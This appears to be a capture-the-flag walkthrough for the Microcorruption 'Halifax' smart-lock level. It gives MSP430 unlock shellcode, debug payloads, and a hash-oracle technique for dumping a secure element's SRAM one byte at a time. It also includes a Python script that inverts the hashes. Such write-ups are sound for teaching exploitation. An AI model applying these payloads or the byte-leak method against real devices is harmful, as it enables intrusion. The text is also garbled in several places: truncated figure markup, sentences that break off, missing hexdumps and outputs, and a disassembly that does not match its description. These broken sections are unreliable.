    <h2>Background</h2>

    <p>The following is a walkthrough for the last in the new series of Microcorruption challenges. The original CTF-turned-wargame was developed a decade ago by Matasano and centered around a deliberately vulnerable smart lock. The goal for each challenge was simple: write a software exploit to trigger an unlock.</p>

    <p>NCC Group later acquired Matasano. They continued maintaining the wargame and added half a dozen new challenges on October 28<sup>th</sup>, 2022, of which this is one.</p>

    <h2>System Architecture</h2>

    <p>The emulated device runs on the MSP430 instruction set architecture. It uses a 16-bit little-endian processor and has 64 kilobytes of RAM. The <a href="https://microcorruption.com/public/manual.pdf">official manual</a> includes the details, but relevant functionality is summarized below.</p>

    <h3>Interface</h3>
    <p>Several separate windows control the debugger functionality.</p>

    <br>
      <figure>
        <img src="./images/algiers/algiers-gui.png"
          loading="eager" alt="Debugger GUI." />
      </figure>

      <p>A user input prompt like the following is the device's external communication interface.</p>
      <br>
      <figure>
        <img src="./images/algiers/algiers-input-prompt.png"
          loading="lazy" alt="Popup triggered by getsn interrupt." />
      </figure>

      <h3>Exploit Development Objective</h3>
      <p>The equivalent of popping a shell on this system is calling interrupt <code>0x7F</code>. On earlier challenges in the series, there is a dedicated function called <code>unlock_door</code> that does this.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock-door-function.png"
          loading="lazy" alt="The unlock door function." />
      </figure>

      <p>Executing the following assembly is functionally equivalent to calling the <code>unlock_door</code> function.</p>

      <pre><code>3240 00ff      mov     #0xff00, sr
b012 1000      call    #0x10
</code></pre>

The assembled version of the above shellcode is below.

<pre><code>324000ffb0121000</code></pre>



      <p>The following message is displayed in the interface when the interrupt is called successfully.</p>

      <br>
      <figure>
        <img src="./images/algiers/algiers-unlock.png"
          loading="lazy" alt="Unlock status message." />
      </figure>

<h2>Overview of Halifax</h2>
    <p>While the debug payload is unsigned and achieving arbitrary code execution is trivial, an attacker must circumvent an undocumented secondary mechanism to bypass authentication and re-enable the unlock interrupt.</p>


<h2>High-Level Analysis</h2>
<h3>Sample Payload</h3>
<p>The debug payload is relatively short, and the load address is read big-endian. The example payload is below.</p>

<pre><code class="asm">8000023041
</code></pre>

<h3>Sample Output</h3>
<p>Running the firmware with the example debug payload will produce the following output at the console:</p>

<pre><code class="asm">Welcome to the test program loader.
Enabling hardened mode
Verifying 0x7f interrupt disabled
0x7f interrupt disabled, key stored in internal SRAM
unlock by providing the 16 byte key to 0x41 interrupt
Internal SRAM Hash:
0865DECED9DEB1245501768025853EA0FE5FAF4D2B7133E2D2F1B8D52ED0588D
Please enter debug payload.
Executing debug payload
Please enter debug payload.
</code></pre>

<p>The debug payload is loaded to address <code>0x8000</code> and successfully executed.</p>

<br>
      <figure>
        <img src="./images/halifax-execution-reaches-8000.png"
          loading="lazy" alt="Execution reaches address 8000." />
      </figure>


<h3>Manual</h3>
<p>The output for the "manual" debugger command contains the following description of the new behavior:</p>

<blockquote>
Any payload is allowed,  because the unlock key must be passed to the new interrupt  with  code 0x41, and this key is only stored in secure memory.
</blockquote>


<h3>Payload Format</h3>
<p>The payload format is the same as in <a href="./vancouver.html">Vancouver</a>.</p>
<br>

      <table>
        <caption>Parsing Format</caption>
        <thead>
          <tr>
            <th>Load Address</th>
            <th>Size (Bytes)</th>
            <th>Executable code</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>8000</code></td>
		  <td><code>02</code></td>
		  <td><code>3041 (RET)</code></td>
          </tr>
        </tbody>
      </table>

<h3>Flow Control Graph</h3>

      <figure>
         <img src="./images/halifax-main-flow-control.png"
          loading="lazy" alt="Main function flow control graph." />
      </figure>

      <h3>Signature Verification</h3>

      <p>The absence of apparent calls to <code>ed25519_verify</code></code><label for="sn-3" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-3" class="sidenote-toggle" />
<span class="sidenote">
	Signature verification on <a href="./st-johns.html">St. Johns</a>, <a href="./cold-lake.html">Cold Lake</a>, and <a href="churchill.html">Churchill</a> relied on this function.
</span>

suggests that the debug payload lacks signature verification. This vulnerability can be confirmed by attempting to submit any arbitrary payload. The crafted payload below includes a size field incremented by two and a second return instruction appended to the end of the executable section.</p>

      <pre><code>800004<mark>30413041</mark></code></pre>

      <p>Breaking at address <code>0x8000</code> and continuing execution verifies that this payload is successfully loaded into memory and executed:</p>

<br>
      <figure>
        <img src="./images/halifax-execution-reaches-8000-2.png"
          loading="lazy" alt="Execution reaches address 8000." />
      </figure>

      <h3>Inconsistent Internal SRAM Hash</h3>
      <p>It is worth noting that the "Internal SRAM Hash" seems to change between runs, which is verifiable by using the <code>reset</code> debugger command and continuing execution from the beginning. Below are two different samples:</p>

<pre><code>Welcome to the test program loader.
Enabling hardened mode
Verifying 0x7f interrupt disabled
0x7f interrupt disabled, key stored in internal SRAM
unlock by providing the 16 byte key to 0x41 interrupt
Internal SRAM Hash:
<mark>B786D20726FB0E6E8EB8ECCD92EFFBEDA6875755722ABE2B15A8D1B4541559CF</mark>
Please enter debug payload.
</code></pre>

<pre><code>Welcome to the test program loader.
Enabling hardened mode
Verifying 0x7f interrupt disabled
0x7f interrupt disabled, key stored in internal SRAM
unlock by providing the 16 byte key to 0x41 interrupt
Internal SRAM Hash:
<mark>74972D7E94276A0BDE1C3046EF81EFB5B079BACDD171CA6B9C1D6B29CCDBFB39</mark>
Please enter debug payload.
</code></pre>

<h3>Sanity Check</h3>
<p>The next step is to verify that the unlock interrupt is disabled, which is accomplished using the following shellcode.</p>

<h5>Shellcode</h5>
<pre><code>800008<mark>324000ffb0121000</mark>
</pre></code>

      <table>
        <caption>Payload Structure</caption>
        <thead>
          <tr>
            <th>Load Address</th>
            <th>Size (Bytes)</th>
            <th>Executable code</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>8000</code></td>
		  <td><code>08</code></td>
		  <td><code>324000ffb0121000</code></td>
          </tr>
        </tbody>
      </table>

<h5>Disassembly</h5>
<pre><code>3240 00ff      mov       #0xff00, sr
b012 1000      call      #0x10
</code></pre>

      <p>Breaking at address <code>8000</code> and single-stepping verifies that the call to address <code>0x10</code> happens as usual. However, it returns with no discernible effect, which suggests that the unlock interrupt is disabled.</p>


<h2>Reverse Engineering Methodology</h2>
<h3>Similar Systems</h3>

<p>Anyone familiar with the original challenges set will remember that some involved bypassing hardware security modules (HSMs). Detailed writeups for the exploits used to bypass these HSMs <a href="https://jaimelightfoot.com/blog/microcorruption-embedded-security-ctf-hanoi/">already</a> <a href="https://jaimelightfoot.com/blog/microcorruption-embedded-security-ctf-whitehorse/">exist</a> elsewhere, but it is worth briefly summarizing how they work because this system may be similar.<label for="sn-4" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-4" class="sidenote-toggle" />
<span class="sidenote">
For this section, emphasis is added unless otherwise noted. 
</span></p>

<h5>HSM Model 1</h5>
<blockquote>
	3.2 HSM Model 1<br>
	The Model 1 of the hardware security module contains a simple interface which allows the MCU to test if an entered password is valid. By default, the interrupt <mark>0x7D</mark> will pass a given password to the HSM, and will set a byte in memory if the password entered matches the stored password.
<br>
<cite>— <a href="https://microcorruption.com/public/manual.pdf">Microcorruption Manual</a></cite>
</blockquote>

<h5>Case Study</h5>
The <a href="https://microcorruption.com/debugger/Hanoi">Hanoi</a> firmware version employs the HSM Model 1.


<blockquote>
	The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the <em>HSM will return if the password  is correct by setting  a flag in memory</em>.

This [hardware version contains] two available  ports: the LockIT Pro Deadbolt should be  connected to  port  1, and the  LockIT  Pro  HSM-1 should be connected to port 2.
    <br>
    <cite>— Hanoi Level Manual</cite>
    </blockquote>

    <p>This external device prevents attackers from extracting passwords by dumping the program strings. It takes a pointer to the user-supplied password and returns a boolean indicating whether the supplied credential is correct.</p>

    <p>There is code on the MCU that is responsible for checking this boolean and triggering the unlock interrupt if the HSM sets it to true. Exploitation involves a logical buffer overflow to overwrite it and make the conditional check pass.</p>


<h5>HSM Model 2</h5>
<blockquote>
	3.3 HSM Model 2
	<br>
	The Model 2 of the hardware security module is a more advanced HSM, with the ability to directly trigger the unlock functionality in the lock. The MCU passes the lock a password, and the HSM will trigger the unlock if the password is valid. By default, the interrupt <mark>0x7E</mark> will pass a given password to the HSM, and the lock will be opened if the password entered matches the stored password.
<br>
<cite>— <a href="https://microcorruption.com/public/manual.pdf">Microcorruption Manual</a></cite>
</blockquote>

<h5>Case Study</h5>
<p>The <a href="https://microcorruption.com/debugger/Whitehorse">Whitehorse</a> firmware version employs the HSM Model 2.</p>

<blockquote>
	The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the HSM will  <em>directly</em> send the correct unlock message to the LockIT Pro Deadbolt  if the password is correct, <em>otherwise no action is taken</em>.
	This [hardware version contains] two available  ports: the LockIT Pro Deadbolt should be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be connected to port 2.
	[...] We have <em>removed the function to unlock the door</em> from the LockIT Pro firmware.
    <br>
    <cite>— Whitehorse Level Manual</cite>
    </blockquote>

    <p>This description is misleading because it implies that the unlock interrupt is blocked at a hardware level (i.e., only the HSM has deadbolt unlock capabilities), potentially leading an attacker into believing they have to perform black-box analysis against the HSM. In reality, it is possible to exploit a stack overflow and inject malicious code to trigger the unlock interrupt from the MCU.</p>

    <h3>The Canadian Connection</h3>
    <p>The disassembly and the status messages indicate that interfacing with external hardware likely requires interrupts <code>0x40</code> and <code>0x41</code>—much like <code>0x7D</code> and <code>0x7E</code> from the original challenge set.</p>

    <p>Halifax is effectively a next-gen version of Whitehorse. Whitehorse is insecure because it does not block the unlock interrupt at a hardware level, whereas Halifax might. A successful attack against the latter will likely involve a more advanced variation on the process used to exploit the former.</p>

<h2>Hardware Architecture</h2>

<h3>Vancouver</h3>
<p>The original hardware design, used in <a href="./vancouver.html">Vancouver</a> and most of the previous versions, resembles the following diagram:</p>
<br>
      <figure>
        <img src="./images/vancouver-hardware.png"
          loading="lazy" alt="Vancouver hardware architecture." />
      </figure>

      <p>The deadbolt is assumed to be an electromechanical device that performs some physical action when supplied with voltage. Control over this action is equivalent to owning the system. Successfully triggering the unlock interrupt from software most likely causes the processor to pull a GPIO pin high, thus supplying voltage to the deadbolt and causing it to retract.</p>

<h3>Hanoi</h3>
<p>Hanoi was the first device version to employ an HSM, relying on it as a secure credential store. Based on the level manual, the hardware architecture resembles the following diagram.</p>
<br>
      <figure>
        <img src="./images/hanoi-hardware.png"
          loading="lazy" alt="Vancouver hardware architecture." />
      </figure>

      <p>Communications between the MCU and HSM occur over a serial line (or similar). This version of the HSM has no way to trigger the unlock directly, relying instead on the MCU to implement this logic. The hardware security architecture of this system is flawed because an attacker with arbitrary code execution on the MCU can ignore the HSM.</p>

      <h3>Whitehorse</h3>
      <p>In addition to serving as a secure credential store, the Model 2 HSM can trigger the unlock directly—although this does not prevent the MCU from doing so. Based on the level manual, the hardware architecture resembles the following diagram.</p>

      <br>
      <figure>
        <img src="./images/whitehorse-hardware.png"
          loading="lazy" alt="Whitehorse hardware architecture." />
      </figure>

      <p>The flaw in the above design is that there is no redundancy. An attacker only needs to exploit one processor to supply voltage to the deadbolt and can safely ignore the other chip.</p>

      <p>This design would require a simple modification to fix: disconnect the MCU from the deadbolt. This countermeasure requires an attacker to compromise the HSM.</p>

      <h3>Halifax</h3>
      <p>Even with the MCU disconnected from the deadbolt, the HSM is still a single point of failure. A better architecture might require consensus among multiple cores before an unlock can be triggered, requiring attackers to compromise the MCU and the HSM in sequence. Preventing an attacker who compromises a single processor from controlling the system could be accomplished with a hardware architecture resembling the following diagram.</p>

<br>

      <figure>
        <img src="./images/halifax-hardware.png"
          loading="lazy" alt="Halifax hardware architecture." />
      </figure>


      <p>The transistor is assumed to be an <code>AND</code> logic gate, meaning that voltage physically cannot be supplied to the deadbolt unless the MCU and the HSM pull their bottom pins high. The code on the MCU communicates with the HSM over serial (or similar), authenticates in some capacity, and the HSM pulls its pin high if the authentication is successful. Even if an attacker gains arbitrary code execution on the MCU, they must still compromise the HSM to pull the other pin high.</p>

      <h2>Attack Surface</h2>
      <p>There are two different approaches for developing a working attack against this system:</p>
      <ol>
	      <li>Assume there is a transistor. The unlock interrupt is disabled at a physics level, requiring exploitation of the HSM and manipulating it into pulling its pin high.</li>
	      <li>Assume there is no transistor. The unlock interrupt is disabled on the MCU itself, which implies that it might be possible to write shellcode that re-enables it before making the interrupt call.</li>
      </ol>

      <p>The latter mechanism effectively relies on security through obscurity to prevent an attacker from re-enabling the interrupt, which makes it the lower-hanging fruit and the logical next target for analysis. The former would effectively require black-box analysis of the interface to an undocumented security processor.</p>

      <h2>Re-Enabling Interrupts From Software</h2>

      <p>Assuming it might be possible to write shellcode that re-enables the unlock interrupt before triggering it, the first approach is to review the documentation for this system and its underlying hardware. The <a href="https://microcorruption.com/public/manual.pdf">manual PDF</a> supplied with the system does not mention the new functionality, so it is impossible to tell what purpose interrupts <code>0x40</code> and <code>0x41</code> serve.</p>

      <h3>The EINT And DINT Instructions</h3>
      <p>Initial internet searches turn up a salient artifact: one of the <a href="https://www.ti.com/sc/docs/products/micro/msp430/userguid/as_5.pdf">manuals</a> for the instruction set architecture contains a reference to instructions that are supposed to disable and enable interrupts.</p>

      <br>
      <figure>
        <img src="./images/msp-430-manual-eint.png"
          loading="lazy" alt="MSP430 manual (EINT/DINT instructions)." />
      </figure>

      <br>

      <figure>
        <img src="./images/msp-430-manual-legend.png"
          loading="lazy" alt="MSP430 manual legend." />
      </figure>

      <p>Attempting to assemble either of these instructions using the provided assembler results in an error:</p>

      <pre><code>Error assembling:
TypeError: a.split(...)[1] is undefined
</code></pre>

<h3>Emulated Instructions</h3>
<p>The manual has an asterisk next to these instructions, which the legend indicates are "emulated instructions." Another architecture <a href="https://www.ti.com/sc/docs/products/micro/msp429/userguid/ag_b.pdf">manual</a> contains a more detailed explanation of this functionality:</p>

<blockquote>
There are core instructions that are implemented into hardware, and emulated instructions that use the hardware construction and emulate instructions with high efficiency. The emulated instructions use core instructions with the additional built-in constant generators CG1 and CG2.
</blockquote>

<p>The following description follows slightly later:</p>

<blockquote>
The assembler accepts the mnemonic of the emulated instruction, and inserts the opcode of the suitable core instruction.
</blockquote>

<p>The following table (taken from the same manual) shows the relationship between emulated instructions and core instructions:</p>

<br>

      <figure>
        <img src="./images/msp-430-emulated-to-core-table.png"
          loading="lazy" alt="Short form of emulated instructions." />
      </figure>

      <p>The third and fourth lines from the bottom indicate the core instructions equivalent to the emulated <code>DINT</code> and <code>EINT</code> instructions.</p>

      <br>

      <table>
        <caption>Emulated instruction equivalents for disabling/enabling interrupts</caption>
        <thead>
          <tr>
            <th>Emulated Instruction</th>
            <th>Core Instruction</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>DINT</code></td>
		  <td><code>BIC #8,SR</code></td>
          </tr>
          <tr>
		  <td><code>EINT</code></td>
		  <td><code>BIS #8,SR</code></td>
          </tr>
        </tbody>
      </table>

      <p>The naive approach is attempting to globally disable and re-enable all interrupts in the hope of re-enabling the blocked one. A simple test of this functionality would entail calling <code>DINT</code> followed by <code>EINT</code>, but there is one caveat to this approach: according to this <a href="https://e2e.ti.com/support/microcontrollers/msp-low-power-microcontrollers-group/msp430/f/msp-low-power-microcontroller-forum/397100/the-notes-about-dint-and-eint-in-user-s-guide">forum post</a>, a few <code>NOP</code> instructions must follow <code>DINT</code> because it takes multiple cycles to take effect.</p>


<h3>Working Around Broken Assemblers</h3>

      <p>The built-in assembler does not work consistently, so the assembler from the <a href="https://github.com/Swiftloke/MSProbe">MSProbe project</a> is used to generate the executable code for the section of the payload containing the <code>DINT</code> and <code>EINT</code> instructions.

<p>The executable code in the example debug payload disassembles to the following:</p>


<pre><code class="asm"><xmp>32c2           bic	#0x8, sr
0343           clr	4

</xmp></code></pre>

<p>Testing the above payload on Vancouver confirms that the unlock is triggered, but this does not work on Halifax. The call to <code>0x10</code> once again returns without visible effect. With the possibility of re-enabling the interrupt from software eliminated, the only remaining option is black-box analysis of the interface to the secure processor.</p>

<h2>Black Box Analysis</h2>
<p>For the sake of argument, assume that the logical <code>AND</code> transistor is present moving forward. Before beginning any deep analysis, the first step is understanding the code that makes interrupt calls to the secure processor interface, which requires a more detailed review of the disassembly and flow control for the <code>main</code> function.</p>

      <p>The <code>0x40</code> interrupt seems to be responsible for enabling "hardened mode." This interrupt effectively disables the unlock interrupt, and the standard portable shellcode has no discernible effect when executed after this call.</p>

      <pre><code>444a:  mov	#0x4658 "Enabling hardened mode", r15
444e:  call	#0x4586 &lt;puts&gt;
4452:  push	#0x0
4454:  push	#0x0
4456:  push	<mark>#0x40</mark>
445a:  call	#0x4550 &lt;INT&gt;
</code></pre>

<p>The firmware behavior confirms this, as it subsequently attempts to call the unlock interrupt to ensure it is disabled.</p>

      <pre><code>4462:  mov	#0x466f "Verifying 0x7f interrupt disabled", r15
4466:  call	#0x4586 &lt;puts&gt;
446a:  push	#0x0
446c:  push	#0x0
446e:  push	<mark>#0x7f</mark>
4472:  call	#0x4550 &lt;INT&gt;
</code></pre>

<p>This check is followed in turn by two <code>puts</code> calls to print the following status messages:</p>

<pre><code>0x7f interrupt disabled, key stored in internal SRAM
unlock by providing the 16 byte key to 0x41 interrupt
</code></pre>


      <h3>Implementation Conjecture</h3>
<p>Based on the above analysis, a few tentative theories emerge:</p>
<ul>
	<li>The <code>0x40</code> interrupt causes the secure processor to pull its GPIO pin low, causing the logical <code>AND</code> gate to turn off and physically preventing unlock interrupts triggered from the MCU from retracting the deadbolt.</li>
	<li>Turning the secure processor's GPIO pin back on requires sending a 16-byte key over the serial line.</li>
	<li>The 16-byte key resides in "SRAM," likely standing for "secure RAM" or "static RAM" and presumably referring to the internal memory of the secure processor.</li>
	<li>The key must be passed to the secure processor through interrupt <code>0x41</code>, using an undocumented calling convention.</li>
</ul>

<p>The fact that the SRAM hash changes between runs suggests that the content of SRAM also changes. It is impossible to rule out random key generation or mutation during the initial <code>0x40</code> interrupt call.</p>

<h2>Hardware Security Background</h2>
<p>While it has been convenient to refer to the external hardware as an "HSM" or "secure processor" up to this point, it is worth noting that it could be one of multiple similar things. These hardware security devices fall into four broad categories:</p>

<ol>
	<li>Hardware Security Modules (HSMs)</li>
	<li>Trusted Platform Modules (TPMs)</li>
	<li>Secure Enclaves or Trusted Execution Environments (TEEs)</li>
	<li>Secure Elements (SEs)</li>
</ol>

<p>WolfSSL has a <a href="https://www.wolfssl.com/difference-hsm-tpm-secure-enclave-secure-element-hardware-root-trust/">page</a> summarizing the differences.</p>




<p>It is possible to execute custom code inside TEEs, but this is not true of the other three categories—which usually only run code written by their respective vendors. The lack of boutique code theoretically means secure elements, HSMs, and TPMs have undergone more intense security testing,<label for="sn-5" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-5" class="sidenote-toggle" />
<span class="sidenote">Of course, this claim is speculative, as it is impossible to determine how much review or testing any proprietary codebase has undergone.</span>

 and fixing vulnerabilities is the vendor's responsibility.</p>

<p>One concern (from a software exploitation standpoint) is the degree to which the device is Turing complete. Some of these devices could theoretically implement operations using varying amounts of analog logic, which means that exploitation in the traditional sense may not be possible because there is no software on the device to exploit.</p>


<h3>Theoretical Attacks</h3>
<p>There are a few possible attacks to consider:</p>
<ol>
	<li>Arbitrary code execution on the "secure processor."</li>
	<li>Authentication bypass due to a logic flaw.</li>
	<li>Leaking the key from SRAM.</li>
</ol>

<p>Arbitrary code execution may or may not be possible. Fuzzing would be difficult without some understanding of the communication protocol or calling convention. Without having an example of how to communicate with the device normally, there are similar problems with attempting to bypass authentication.</p> 

<p>The compiled code for the implementation may reside in SRAM. Even if it is impossible to extract the key, acquiring an image of the running firmware for further analysis might still be possible. One way or another, an information leak is likely required.</p>

<h2>Hunting For Information Leaks</h2>
<h3>SRAM Hash Calculation</h3>
<p>The obvious target for a memory leak is functionality that already reads data from SRAM. The SRAM hash calculation is a likely candidate.</p>

<p>The <code>sha256_internal</code> function is a wrapper for an <code>0x41</code> interrupt call, which implies that the interrupt used to pass the unlock key is the same one used to compute the SRAM hash.</p>

<pre><code>45b6 &lt;sha256_internal&gt;
45b6:  0d12           push	r13
45b8:  0e12           push	r14
45ba:  0f12           push	r15
45bc:  3012 4100      push	<mark>#0x41</mark>
45c0:  b012 5045      call	#0x4550 &lt;INT&gt;
45c4:  3152           add	#0x8, sp
45c6:  3041           ret
</code></pre>

<p>The setup for the function call is as follows.</p>

          loading="lazy" alt="Halifax sha256_internal parameters." />
      </figure>
<hr>

<p>The value in <code>R13</code> is a pointer to the stack—likely the location where the function returns the computed checksum. Observing stack memory before and after the call confirms this theory.</p>

<p>This string is not defined anywhere in the program memory and prints to the debugger console rather than the I/O console.</p>

<h5>Further permutations:</h5>

	<li>Setting <code>R15</code> to 0x1 produces the same error.</li>
	<li>Changing <code>R14</code> to 0x800 and <code>R15</code> to 0x1 seems to result in normal behavior.</li>
</ul>

<h3>Address Range Data Hashing</h3>
<p>If the <code>sha256_internal</code> function is computing a checksum for a fixed-length block of memory at a known offset, it should logically need only one parameter (the address of the stack buffer where interrupt <code>0x41</code> writes the returned checksum). The fact that there are two more implies that the interrupt hashes a specific section of SRAM. Such functionality would require two more parameters, i.e., a start and end address.</p>

<p>It makes no sense to have a length of zero (the default value passed in <code>R15</code> by <code>main</code>), which implies that <code>R14</code> is the length and <code>R15</code> is the start offset.

<p>It is then possible to run all 256 possible individual bytes through sha256 to find which one produced the hash.</p>  

<h3>Proof Of Concept</h3> 
<p>Verifying the vulnerability is simple: because any given memory space will generally have many nulls, choosing a random start offset in high memory will likely return the hash of a single null byte. Take a case where <code>R15</code> is 0x800 and <code>R14</code> is 0x1.</p>

<p>Given these parameters, the I/O console will probably print the hash for a single null byte.</p>

<h5>Resulting Hash:</h5>

<pre><code>Internal SRAM Hash:
6E340B9CFFB37A989CA544E6BB780A2C78901D3FB33738768511A30617AFA01D
</code></pre>

<h5>Known Preimage:</h5>

<p>A sha256 hash can be calculated in Python using the following code.</p>

<pre><code>python3 -i
&gt;&gt;&gt; import hashlib
&gt;&gt;&gt; import binascii
&gt;&gt;&gt; binascii.hexlify(hashlib.sha256(b'\x<mark>00</mark>').digest())
b'6e340b9cffb37a989ca544e6bb780a2c78901d3fb33738768511a30617afa01d'
</code></pre>

<p>The known hash for a single null byte matches the one printed to the I/O console, confirming that the byte at offset 0x800 in SRAM is 0x00 and that it is possible to checksum individual bytes. The information leak vulnerability exists and is exploitable.</p>

<h5>A note on the workings of hashing algorithms:</h5>
<p>It may not be immediately clear why this proves it is possible to leak individual byte values rather than words. To illustrate why this is so, consider the following Python code.</p>

<pre><code>&gt;&gt;&gt; import hashlib
&gt;&gt;&gt; import binascii
&gt;&gt;&gt; binascii.hexlify(hashlib.sha256(b'<mark>\x00\x00</mark>').digest())
b'96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7'
</code></pre>

<p>Passing a single null byte through a hashing algorithm produces a different output than doing the same with two null bytes. Given an algorithm resistant to collisions (like SHA256), a matching checksum implies that the hashing operation occurs on a single null byte rather than a null word.</p>

</code></pre>


<h2>Exploit Weaponization</h2> 
<p>While it is convenient to single-step and manually edit register values to leak individual bytes, a more efficient technique is required to extract the entire contents of SRAM. There is already existing code in memory to call <code>sha256_internal</code> and print the resulting hash to the I/O console.</p>

<br>
<hr>

      <figure>
        <img src="./images/halifax-sha256-print.png"
          loading="lazy" alt="Loop that prints the SHA256 hash to the I/O console." />
      </figure>
      <hr>

<p>All that is required is some payload code to patch in an unconditional branch in the middle of the <code>main</code> function, set the values for <code>R13</code>, <code>R14</code>, and <code>R15</code>, and branch to address <code>0x44a6</code> (right before the call to <code>sha256_internal</code>). This code will run in a loop, printing the hash for every byte in SRAM. An improvised "data section" is also necessary to store a counter used as the offset passed in <code>R15</code> with each iteration.</p>



      <h3>Functionality Breakdown</h3>

      <p>The payload would be a while loop if implemented in a higher-level language. The first instruction is responsible for jumping over the data section:</p>

<p>The last item of importance is the termination condition. This loop will run past the end of SRAM and cause the processor to halt with the <code>"Exceeded SRAM length"</code> error. While this is not problematic for this version, it will be necessary to avoid this when extending the payload with more code later.</p>

<p>The SRAM is 4096 bytes long. One of the words in the data section stores this value, and the payload code compares it to the current offset after every iteration. If the current offset is 0x1000, the code deliberately jumps into null memory and crashes the MCU.</p>

<p>If the current offset is not 0x1000, execution branches into the middle of the <code>main</code> function just before the loop that prints the internal SRAM hash. After it prints the hash for the current byte, execution will reach the branch instruction patched in earlier. This instruction will cause execution to branch back to the start of the shellcode, thus completing one iteration of the loop. Every iteration will print the hash of one byte in SRAM to the I/O console.</p>

      <p>The size field is 255 (0xFF) for convenience, which causes copying of the null memory after the executable code section to the load address along with it. This quirk does not affect the payload code, so it is acceptable.</p>
<h5>Data section:</h5>

<p>The data section is defined<label for="sn-6" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-6" class="sidenote-toggle" />

      <p>There are 4096 hashes, but every single one after a certain point is the known hash for the null byte—indicating SRAM contains little data. The above output omits most of the null checksums for brevity.</p>

      <h3>Extracting Data</h3>
      <p>Deriving the original SRAM contents from the hashes is possible by building a small rainbow table, which can be implemented in Python as follows:</p>

      <pre><code><xmp>import hashlib
import binascii

table = {}

for i in range(0,256):
    table[hashlib.sha256((i).to_bytes(1, "big")).hexdigest().upper()] = i.to_bytes(1, "big")

output = b''

for line in open('hashes.txt', 'r'):
    output += table[line.strip()]

with open("output.bin", "wb") as f:
    f.write(output)

print(binascii.hexlify(output).decode())</xmp></code></pre>


      <p>Pasting the above 4096 hashes into a text file called "hashes.txt" and running the above Python script on it will produce a file called "output.bin" containing the contents of SRAM as raw binary data. Taking a hexdump of this file produces the following output:</p>

<pre><code><xmp>hexdump -C output.bin

<h3>Differential Analysis</h3>
<p>The fact that the SRAM contents change between runs is apparent from the differing SRAM hashes. The next objective is to determine what is changing. The following snippets are hexdumps of the output from five different runs.</p>

<p>There are a few key takeaways from this. The size of the nonzero section seems to vary between runs (it may be either 0x40 or 0x140 bytes long). There is also no observable similarity between SRAM dumps when the length is the same.</p>

<p>If executable code exists in SRAM, it changes drastically between runs. The ISA for this processor requires all instructions to be either 2, 4, 6, or 8 bytes long. Attempting to disassemble the first two payloads from offsets 0, 2, 4, and 6 should produce at least one disassembly listing where the executable segment is aligned and intelligible. It is also necessary to account for endianness reversal. The following Python script prints hex strings of SRAM (both big and little-endian).</p>

<pre><code>import binascii

with open('output.bin', 'rb') as f:
	original = f.read()
	byteswapped = bytearray(len(original))
	byteswapped[0::2] = original[1::2]
	byteswapped[1::2] = original[0::2]

print(binascii.hexlify(original[0:0x150]))
print(binascii.hexlify(byteswapped[0:0x150]))

<p>Repeatedly disassembling after removing two, four, or six bytes from the beginning yields similarly unintelligible output. This pattern holds true for samples that are both 0x40 and 0x140 bytes long—regardless of endianness—and suggests an absence of executable code in SRAM.</p>

<h2>Chip Identification</h2>
<p>Based on the information acquired thus far, it is possible to conjecture about the "secure processor" class used by this system. Four pieces of circumstantial evidence stand out.</p>

<ol>
	<li>The manual command output refers to "secure memory" storing the key.</li>
	<li>SRAM has a capacity of 4K.</li>
	<li>There is no discernible executable code in SRAM.</li>
	<li>The main MCU targets the highly embedded device market.</li>
</ol>

<p>These observations support the hypothesis that the external device is a secure element. The rationale for this is as follows.</p>

<ul>
	<li>"Secure memory" has been<label for="sn-7" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-7" class="sidenote-toggle" />
<span class="sidenote">For example, see research by Olivier Hériveaux against the ATECC family of chips (i.e., <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/blackbox_laser_fault_injection_on_a_secure_memory/SSTIC2020-Article-blackbox_laser_fault_injection_on_a_secure_memory-heriveaux.pdf">ATECC508A</a> or <a href="https://www.youtube.com/watch?v=Kj1nVJypXPM">ATECC608B</a>). The term "secure element" may be a somewhat inaccurate description, as the author notes that the ATECC508A may be erroneously marketed as a secure element when it does not have the relevant certifications to meet that standard for security.

<br><br>

Regardless of whether the term "secure element" is accurate for describing the ATECC family of chips, this system resembles them because they have both GPIO pins and "secure memory."

	<li>Secure elements are usually cheaper devices that have less storage than standard TPMs. 4KB is a minuscule quantity of memory for one of these; the usual<label for="sn-8" class="sidenote-toggle sidenote-number"></label>

			range is 6KB-50KB.</li> 
	<li>The lack of apparent code in SRAM suggests that it is used only for sensitive data storage. This functionality is consistent with WolfSSL's description<label for="sn-9" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-9" class="sidenote-toggle" />
<span class="sidenote">A text search for "secure memory" in the WolfSSL <a href="https://www.wolfssl.com/difference-hsm-tpm-secure-enclave-secure-element-hardware-root-trust/">page</a> from earlier locates only one instance of the term. This phrase is found only in the section describing secure elements.</span>

		of the "secure memory" typically offered by secure elements.</li>
	<li>It is unlikely that the system architects would have opted for a more expensive chip for a highly embedded and ostensibly low-cost device.</li>
</ul>

<h3>Refining The Scope</h3>
<p>Assuming the "secure processor" is a secure element, the vendor typically develops the code running on it.</p> 

<p>The contents of SRAM appear to be data only, which implies that there is separate memory for executable code. Lacking a way to leak executable code from the secure element, achieving code execution may be impossible. An authentication bypass vulnerability is the last contingency.</p>


<p>The lack of SRAM consistency confirms the random generation of the 16-byte key during each run. Unblocking interrupt <code>0x7F</code> would require brute-forcing the calling convention for interrupt <code>0x41</code> and passing every possible key in SRAM.</p>

<h2>The Secure Element ABI</h2>
<h3>Dissecting The Calling Convention</h3>
<p>Recall that interrupt <code>0x41</code> calculates the sha256 hash of SRAM <em>and</em> takes a key to unblock the unlock interrupt. The <code>sha256_internal</code> function is a wrapper around a call to interrupt <code>0x41</code>, so the <code>INT</code> call within <code>sha256_internal</code> provides a clue as to what calling convention interrupt <code>0x41</code> might expect when parsing the key.</p>


<pre><code>45b6 &lt;sha256_internal&gt;
